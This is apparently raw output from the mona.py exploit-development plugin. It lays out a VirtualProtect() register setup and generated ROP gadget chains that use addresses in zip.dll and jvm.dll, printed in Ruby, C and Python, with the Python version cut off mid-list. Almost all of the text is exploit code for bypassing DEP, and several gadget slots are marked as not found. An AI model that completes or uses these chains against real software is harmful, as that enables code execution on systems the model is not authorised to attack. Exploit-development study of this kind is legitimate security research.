0BADF00D      Tue 2018/10/30 04:45:40 AM: Step 4/7: edx
0BADF00D      Tue 2018/10/30 04:45:40 AM: Step 5/7: ecx
0BADF00D      Tue 2018/10/30 04:45:40 AM: Step 6/7: edi
0BADF00D      Tue 2018/10/30 04:45:40 AM: Step 7/7: eax
0BADF00D  [+] ROP chains written to file rop_chains.txt
          
          ################################################################################
          
          Register setup for VirtualProtect() :
          --------------------------------------------
           EAX = NOP (0x90909090)
           ECX = lpOldProtect (ptr to W address)
           EDX = NewProtect (0x40)
           EBX = dwSize
           ESP = lPAddress (automatic)
           EBP = ReturnTo (ptr to jmp esp)
           ESI = ptr to VirtualProtect()
           EDI = ROP NOP (RETN)
           --- alternative chain ---
           EAX = ptr to &VirtualProtect()
           ECX = lpOldProtect (ptr to W address)
           EDX = NewProtect (0x40)
           EBX = dwSize
           ESP = lPAddress (automatic)
           EBP = POP (skip 4 bytes)
           ESI = ptr to JMP [EAX]
           EDI = ROP NOP (RETN)
           + place ptr to "jmp esp" on stack, below PUSHAD
          --------------------------------------------
          
          
          ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
          ----------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d3f8098,  # ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
                0x6d3234f8,  # POP EBP # RETN [zip.dll] 
                0x00000000,  # &  [Unable to find ptr to 'JMP ESP']
                0x6d324b54,  # POP EBX # RETN [zip.dll] 
                0x00000201,  # 0x00000201-> ebx
                0x00000000,  # [-] Unable to find a gadget to clear edx
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d324c50,  # POP ECX # RETN [zip.dll] 
                0x6d32ae52,  # &Writable location [zip.dll]
                0x6d3228b0,  # POP EDI # POP ESI # RETN [zip.dll] 
                0x6d324c9c,  # RETN (ROP NOP) [zip.dll]
                0x41414141,  # Filler (compensate)
                0x6d324c9b,  # POP EAX # RETN [zip.dll] 
                0x90909090,  # nop
                0x00000000,  # [-] Unable to find pushad gadget
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d3f8098,  // ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
                0x6d3234f8,  // POP EBP // RETN [zip.dll] 
                0x00000000,  // &  [Unable to find ptr to 'JMP ESP']
                0x6d324b54,  // POP EBX // RETN [zip.dll] 
                0x00000201,  // 0x00000201-> ebx
                0x00000000,  // [-] Unable to find a gadget to clear edx
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d322938,  // INC EDX // POP EAX // POP EBX // RETN [zip.dll] 
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x6d324c50,  // POP ECX // RETN [zip.dll] 
                0x6d32ae52,  // &Writable location [zip.dll]
                0x6d3228b0,  // POP EDI // POP ESI // RETN [zip.dll] 
                0x6d324c9c,  // RETN (ROP NOP) [zip.dll]
                0x41414141,  // Filler (compensate)
                0x6d324c9b,  // POP EAX // RETN [zip.dll] 
                0x90909090,  // nop
                0x00000000,  // [-] Unable to find pushad gadget
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find gadgets to pickup the desired API pointer into esi
                0x6d3f8098,  # ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
                0x6d3234f8,  # POP EBP # RETN [zip.dll] 
                0x00000000,  # &  [Unable to find ptr to 'JMP ESP']
                0x6d324b54,  # POP EBX # RETN [zip.dll] 
                0x00000201,  # 0x00000201-> ebx
                0x00000000,  # [-] Unable to find a gadget to clear edx
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x6d322938,  # INC EDX # POP EAX # POP EBX # RETN [zip.dll] 
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
